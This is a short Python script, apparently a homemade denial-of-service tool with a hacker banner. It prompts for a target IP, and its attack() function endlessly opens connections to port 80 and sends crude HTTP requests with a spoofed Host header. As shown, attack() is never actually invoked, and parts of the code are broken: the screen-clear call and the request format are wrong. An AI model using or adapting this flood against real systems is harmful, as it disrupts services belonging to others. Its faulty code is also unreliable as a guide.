import socket
import threading
import socket,os
from typing import Counter
from colorama import Fore,init
import time
init()
RESET = Fore.RESET
def banner():
    os.system("cls" or "clear")
    print(Fore.GREEN+"""
-----------------
my instagram war__dark v2
-----------------    
    """+RESET)
banner()    
ip = input("Enter ip ???: ")
fackip = "8.8.8.8"
port = 80
Counter = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        s.connect((ip , port))
        s.sendto(("GET /"+ip+"HTTP/1.1\r\n").encode("ascii"),(ip , port))
        s.sendto(("Host:"+fackip+"\r\n\r\n").encode("ascii"),(ip , port))

        global Counter
        Counter += 1
        print(f"{Fore.RED} poket {str(Counter)} send-> {RESET} \n")
        s.close()
print(Fore.RED+"ip fack dup:))0")
time.sleep(2)
